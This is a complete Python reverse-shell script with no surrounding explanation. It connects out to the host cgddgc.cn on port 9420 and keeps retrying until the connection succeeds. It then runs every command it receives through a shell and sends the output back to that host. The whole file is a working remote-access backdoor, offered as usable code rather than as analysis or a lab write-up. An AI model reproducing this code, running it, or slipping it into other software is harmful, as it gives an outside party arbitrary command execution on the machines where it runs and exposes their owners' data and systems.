#!python3
#coding=utf-8
import subprocess,socket,time

class rev:
    def __init__(self):
        self.host='cgddgc.cn'
        self.port=9420
        self.target=(self.host,self.port)       
        self.s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    
    def conn(self):  
        while True:
            try:
                self.s.connect(self.target)
                break
            except Exception as e:
                #self.s.close()
                time.sleep(3)
                continue


    def rev_tcp(self):
        self.conn()
        while True:
            self.sdata=self.s.recv(4096).decode('utf-8')
            self.sdata=self.sdata if (self.sdata!='' and self.sdata[-1] != '\n') else self.sdata[:-1]
            if not self.sdata=='exit':
                #print(self.sdata)
                try:
                    self.sub=subprocess.Popen(self.sdata,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                    self.sub.wait(3)
                    self.out=self.sub.stdout.read()+self.sub.stderr.read()
                    #print(self.out)
                    self.s.send(self.out)
                except Exception as e:
                    #self.sub.kill()
                    continue
            else:
                self.s.close()
                break

if __name__ == '__main__':  
    app=rev()
    app.rev_tcp()